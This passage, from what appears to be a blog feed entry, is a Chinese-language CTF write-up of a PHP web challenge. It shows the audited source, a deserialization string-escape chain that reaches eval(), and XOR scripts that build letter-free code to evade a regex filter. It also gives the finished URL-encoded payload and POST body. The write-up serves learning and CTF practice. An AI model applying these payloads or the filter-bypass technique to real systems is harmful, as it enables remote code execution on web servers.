class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这里的话大佬应该能猜到是反序列化逃逸</strong>)      反正我没猜到…………</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(`Login First!`);location.href=`./index.php`;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">a</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$login</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>my.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x) &#123;</span><br><span class="line"><span class="variable">$preg_match</span> = <span class="string">&#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$preg_match</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$preg_match</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;save_waf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>开始代码审计</strong></p><p><img src="../images/image-20230724162222075.png" alt="image-20230724162222075"></p><p><strong>首先是在<code>index.php</code>处进行序列化操作 </strong>   <strong>然后在用b函数进行替换操作</strong></p><p><img src="../images/image-20230724162404370.png" alt="image-20230724162404370"></p><p><strong>最后是在这个<code>login.php</code>处先将序列化字符串进行a函数替换  然后再进行反序列化</strong></p><p><strong>命令执行是在这个地方</strong></p><p><img src="../images/image-20230724162637962.png" alt="image-20230724162637962"></p><p>就是在<code>my.php</code>这个里面  其实就是无数字字母RCE  但是这不是关键  关键是如何进行<strong>序列化字符串逃逸</strong></p><p><strong>先使用之前羽师傅写的一个异或脚本来生成自己想要执行的命令</strong></p><p><strong>xor.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>xor.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>使用方法就是先使用php生成字典  然后再使用python来生成自己想要的命令</strong></p><p><img src="../images/image-20230724163944186.png" alt="image-20230724163944186"></p><p>然后开始构造链子</p><p><img src="../images/image-20230724164349115.png" alt="image-20230724164349115"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;pull_it&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;pull_itx&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;(&quot;</span> <span class="string">&quot;^&quot;</span>&#123;&#123;&#123;|``<span class="string">&quot;)(&quot;</span><span class="string">&quot;^&quot;</span>``| /`*<span class="string">&quot;);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//没编码前</span></span><br><span class="line">O%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>pull_it%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>pull_it%<span class="number">00</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A41%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">08</span>%<span class="number">02</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">05</span>%<span class="number">0</span>D%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">60</span>%<span class="number">60</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">03</span>%<span class="number">01</span>%<span class="number">08</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">06</span>%<span class="number">00</span>%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">7</span>C+%<span class="number">2</span>F%<span class="number">60</span>%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="comment">//编码后                                                 </span></span><br></pre></td></tr></table></figure><p><strong>因为这里的是因为不能传入这个<code>pull_it</code>这个类直接进行反序列化</strong></p><p><img src="../images/image-20230724190117444.png" alt="image-20230724190117444"></p><p><strong>所以说我们就得尝试进行字符逃逸  把这个序列化后的结果加进去</strong></p><p>开始逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=<span class="string">&quot;;s:5:&quot;</span>datou<span class="string">&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>(逃逸了14个字符)</p><p>这里解释一下</p><p><img src="../images/image-20230724190419607.png" alt="image-20230724190419607"></p><p><strong>刚好是14个  其实也可以不是14个  这要看你自己的构造了</strong></p><p>先使用常规的方法生成一下实例化的内容·</p><p><img src="../images/image-20230724190736840.png" alt="image-20230724190736840"></p><p><code>aa</code>是我们<code>root</code>传入的位置  <code>bb</code>是我们<code>pwd</code>传入的位置  </p><p><img src="../images/image-20230724190920747.png" alt="image-20230724190920747"></p><p>这是<strong>payload</strong>   这里一共传入了<strong>82个b</strong>字符   经过这个反序列化的时候 <strong>a函数</strong>的替换</p><p><img src="../images/image-20230724191030189.png" alt="image-20230724191030189"></p><p>会变成42个字符a   于是给我们提供了42位的逃逸空间</p><p>于是我们就可以查看</p><p><img src="../images/image-20230724191238844.png" alt="image-20230724191238844"></p><p><img src="../images/image-20230724191508816.png" alt="image-20230724191508816"></p><p>然后就是<code>13+29==42</code>就会成功逃逸成功  后面跟着<code>pull_it</code>这个序列化后的恶意类</p><p>因为逃逸的关系  (<strong>原本的<code>pwd</code>参数也变成了<code>root</code>的值，然后又添加进来一个<code>datou</code>，刚好满足两个参数的要求</strong>)</p><p>于是就成功逃逸出来了(<strong>后面多出来的一些字符并不影响 并且直接添加一个序列化后的类也是可以反序列化的</strong> )</p><p><img src="../images/image-20230724191908997.png" alt="image-20230724191908997"></p><p><strong>本地测试过了</strong>  </p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>重新温习了字符串逃逸这个知识点</strong></li><li><strong>学到了这个在一个序列化后的字符串后面继续添加一个别的类的序列化字符串也是可以一起进行反序列化</strong></li></ul><p><strong>测试过程的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$system</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span>,<span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;system = <span class="variable">$s</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(calc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($t);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;</span></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($u);</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&quot;&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BabyURL&quot;&gt;&lt;a href=&quot;#BabyURL&quot; class=&quot;headerlink&quot; title=&quot;BabyURL&quot;&gt;&lt;/a&gt;BabyURL&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;审计代码得出一个思路&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;就是在反序列化的时候会将得到的</summary>
      
    
    
    
    
    <category term="巅峰极客2023-Web" scheme="https://ke1nys.github.io/tags/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023-Web/"/>
    
  </entry>
  
</feed>
